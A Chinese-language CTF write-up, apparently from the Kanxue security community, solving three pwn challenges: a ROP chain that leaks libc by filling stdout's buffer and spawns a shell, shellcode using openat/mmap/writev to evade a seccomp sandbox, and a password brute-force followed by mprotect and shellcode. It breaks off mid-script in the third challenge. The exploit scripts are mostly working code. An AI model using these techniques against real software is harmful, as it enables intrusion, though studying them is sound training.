---
title: PWN 赛题解析
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458565345&idx=1&sn=78d2e99e3ff2ab0578132c1dbb67d5ca&chksm=b18d8a6b86fa037ddf1567e5c9a9a7a9d50a68951fcd7b7108e68c96d3d80fa0a40b78353652&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-07-31
fetch_date: 2025-10-06T17:43:52.684156
---

# PWN 赛题解析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRN9o6XR1xzf6GoXm28pic8CqnJlib9V4nglibpoXO5iayZPknbKkOOqImBKw/0?wx_fmt=jpeg)

# PWN 赛题解析

waddle

看雪学苑

##

```
一

stdout
```

## 问题

main函数：

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  init(argc, argv, envp);
  puts("where is my stdout???");
  read(0, buf, 0x60uLL);
  return 0;
}
```

vuln函数：

```
ssize_t vuln()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  return read(0, buf, 0x200uLL);
}
```

init函数：

```
int init()
{
  setvbuf(stdout, 0LL, 0, 0LL);
  return setvbuf(stdin, 0LL, 2, 0LL);
}
```

一开始的思路是main函数栈溢出劫持至vuln函数，vuln函数栈溢出调用puts得到libc地址，但是`setvbuf(stdout, 0LL, 0, 0LL);`无法得到回显。

再者的思路是ret2csu，但是无法控制rcx第四个参数致使setvbuf报错，行不通。

## 解决办法

关键是init函数，`setvbuf(stdout, 0LL, 0, 0LL)`标准输出全缓冲，即缓冲区被填满才会进行i/o操作。

```
int init()
{
  ;
  return setvbuf(stdin, 0LL, 2, 0LL);
}
```

刷新缓冲区的方法：

1.填满缓冲区后会刷新

2.exit退出会刷新缓冲区

3.调用fflush函数

4.流被关闭（调用`fclose`）

在这道题中，我们采用第一种方式进行i/o操作，即重复多次调用extend函数填满缓冲区。

```
from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')
libc = ELF('./libc-2.31.so')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

vuln = 0x40125D
extend = 0x401287
puts_plt = 0x4010B0
read_got = 0x404028
pop_rdi_ret = 0x00000000004013d3

payload = b'a'*0x58 + p64(vuln)
s(payload)

#gdb.attach(p,'b *0x40127F')
#pause()

p2 = b'a'*0x28 + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) +p64(extend) + p64(vuln)
s(p2)

#gdb.attach(p,'b *0x40127F')
#pause()

#重复调用extend函数填满缓冲区
for i in range(20):
    p3 = b'b'*0x28 + p64(extend) + p64(vuln)
    s(p3)

#p3 = b'a'*0x28 + p64(extend) + p64(vuln)
#s(p3)
p.recvuntil(b'\n')
libcbase = u64(p.recv(6).ljust(8,b'\x00')) - 0x10dfc0
log.success('libcbase ==> ' + hex(libcbase))
p.recv()

sys=libc.symbols['execve']+libcbase
sh=next(libc.search(b'/bin/sh'))+libcbase

#gdb.attach(p,'b *0x40127F')
#pause()

ret = 0x000000000040101a
pop_rsi_r15 = 0x00000000004013d1
pop_rdx_ret = 0x0000000000142c92 + libcbase
p4 = b'c'*0x28 + p64(pop_rdi_ret) + p64(sh) +p64(pop_rsi_r15)+ p64(0)+ p64(0) +p64(pop_rdx_ret)+ p64(0)+p64(sys)
s(p4)
p.interactive()
```

#

##

```
二

Shuffled_Execution
```

使用带有`\x00`的汇编指令绕过strlen，我使用的是`mov esi,0`机器码为`\xbe\x00\x00\x00\x00`(小端序)。

沙箱禁用了许多系统调用，具体如下：

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015
 0005: 0x15 0x09 0x00 0x00000000  if (A == read) goto 0015
 0006: 0x15 0x08 0x00 0x00000001  if (A == write) goto 0015
 0007: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0015
 0008: 0x15 0x06 0x00 0x00000011  if (A == pread64) goto 0015
 0009: 0x15 0x05 0x00 0x00000013  if (A == readv) goto 0015
 0010: 0x15 0x04 0x00 0x00000028  if (A == sendfile) goto 0015
 0011: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0015
 0012: 0x15 0x02 0x00 0x00000127  if (A == preadv) goto 0015
 0013: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0015
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0015: 0x06 0x00 0x00 0x00000000  return KILL
```

寻常的orw无法使用，这里我采用的是openat，mmap，writev来读取flag。

##

## 函数原型

### openat

```
ssize_t openat(int dfd, const char* filename, int flags, umode_t mode);
```

函数的第一个参数`dfd`指的是当`path`为相对路径时，该路径在文件系统中的开始地址（即打开目录获取的文件描述符），但可以指定其为`AT_FDCWD`(-100)，指定路径为当前路径。另外3个参数与`open`参数相同。`openat`的返回值与`open`相同，都是当前正未使用的最小的文件描述符值。

### mmap

```
long sys_mmap(unsigned long addr, unsigned long len,
            unsigned long prot, unsigned long flags,
            unsigned long fd, off_t pgoff);
```

对于Linux系统调用，6个参数的传递寄存器分别为`rdi`、`rsi`、`rdx`、`r10`、`r8`、`r9`。与Glibc的传参有所不同。

内核的`mmap`函数的`flag`参数和glibc的不太一样，0x10表示映射文件`MAP_FILE`，0x2表示私有映射`MAP_PRIVATE`，0x20表示匿名映射`MAP_ANONYMOUS`。这里需要使用`MAP_FILE | MAP_PRIVATE`才能完成映射。

### writev

```
ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
```

`fd`: 文件描述符，表示要写入的文件、管道或网络套接字。

`iov`: 指向`iovec`结构数组的指针，每个`iovec`结构包含一个缓冲区和其长度。

`iovcnt`:`iovec`结构的数量。

**iovec结构体：**

```
struct iovec {
    void  *iov_base; // 指向数据缓冲区的指针
    size_t iov_len;  // 缓冲区的长度
};
```

##

## solve

思路是绕过strlen直接写shellcode。

直接在栈上写writev第二个参数(结构体指针)的\*iov\_base和iov\_len，主要是直接通过汇编操作就像下面的示例，会报错(不清楚原因)。

```
push 0x100
lea rbx, [rsp+8]
push rbx
mov rsi, rsp
```

脚本：

```
from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

mov_esi_0=b'\xbe\x00\x00\x00\x00'
p.recv()

shell = '''
mov rsp,0x1338000
 mov rax, 0x67616c66
    push rax
    xor rdi, rdi
    sub rdi, 100
    mov rsi, rsp
    xor edx, edx
    xor r10, r10
    push SYS_openat
    pop rax
    syscall

 mov rdi, 0x10000
    mov rsi, 0x1000
    mov rdx, 7
    push 0x12
    pop r10
    push 0x3
    pop r8
    xor r9, r9
    push SYS_mmap
    pop rax
    syscall

    push 1
    pop rdi
    push 0x1    /* iov size */
    pop rdx
    mov rsi, 0x1337070
    push SYS_writev
    pop rax
    syscall
'''

#gdb.attach(p)
#pause()
payload= mov_esi_0+asm(shell)
payload = payload.ljust(0x70,b'\x90')
#栈上写参数
payload+= p64(0x10000) + p64(0x100)
s(payload)

p.interactive()
```

#

##

```
三

SavethePrincess
```

## 随机数绕过

随机数生成范围为a-z：

```
 for ( i = 0; i <= 7; ++i )
    love[i] = rand() % 26 + 97;
```

buf数组和字符i内存区域相邻，当buf数组填满会将字符i打印出来，通过泄露的字符i爆破随机数。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GDgjicLBjGjBq63Hnp7DmRNrUewjuVFsiczjGruknDAlmfBWr5rU2GUNIodMrxZ9aHyJDicBMr28YVA/640?wx_fmt=other&from=appmsg)

单字节爆破，最多爆破26\*8=208次，下面是我写的爆破脚本。

```
key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
data = ''
num = 0

while True:
    sla(b'> \n', b'1')
    sa(b'please input your password: \n', ''.join(key))
    p.recv(26)
    data = ord(p.recv(1))
    log.success(data)

    if (data == num + 1):
        num += 1

    elif (data == 112):
        key_list = ''.join(key)
        log.success(key_list)
        break

    else:
        key[num] = chr(ord(key[num])+1)
```

##

## 流程

接下来就是格式化字符串泄露stack和libc，进challenge函数打栈溢出。

先看一眼沙箱，发现又把常见的orw禁用掉了，无法调用read写bss段，所以我选择打栈。

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013
 0006: 0x15 0x06 0x00 0x00000002  if (A == open) goto 0013
 0007: 0x15 0x05 0x00 0x00000013  if (A == readv) goto 0013
 0008: 0x15 0x04 0x00 0x00000028  if (A == sendfile) goto 0013
 0009: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0013
 0010: 0x15 0x02 0x00 0x00000127  if (A == preadv) goto 0013
 0011: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

先用mprotect函数给栈段开权限，注意的是mprotect的第一个参数需要内存页对齐(0x1000)，然后接上shellcode，`openat，mmap，write`打出flag。

```
from pwn import *
context(log_level = 'debug',arch = 'amd64')
p = process('./pwn')
libc = ELF('./libc.so.6')

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a,b: p.sendlineafter(a,b)
sa = lambda a,b: p.sendafter(a,b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

key = ['a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']
data = ''
num = 0

while True:
    sla(b'> \n', b'1')
    sa(b'please input your password: \n', ''.join(key))
    p.recv(26)
    data = ord(p.recv(1))
    log.success(data)

 ...